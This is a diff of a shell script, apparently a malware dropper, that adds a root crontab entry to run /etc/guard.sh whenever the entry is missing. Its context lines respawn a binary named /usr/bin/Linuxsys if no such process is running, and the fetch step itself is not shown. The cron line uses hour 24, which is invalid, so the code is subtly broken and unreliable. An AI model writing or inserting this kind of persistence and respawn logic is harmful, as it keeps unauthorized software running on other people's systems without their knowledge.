@@ -9,6 +9,16 @@ else
     echo ""
 fi
 
+
+xcrontab=$(cat /etc/crontab | grep "bash /etc/guard.sh" | grep -v grep |wc -l)
+if [ $xcrontab -eq 0 ];then
+	echo "00	24	*	*	*	bash /etc/guard.sh" >> /etc/crontab
+else
+	echo ""
+fi
+
+
+
 download=$(ps aux | grep /usr/bin/Linuxsys | grep -v grep | wc -l)
 if [ $download -eq 0 ];then
 	if [ ! -f "/usr/bin/Linuxsys" ];then
@@ -29,5 +39,5 @@ if [ $download -eq 0 ];then
 	fi
 else
 	echo ""
-
 fi
+
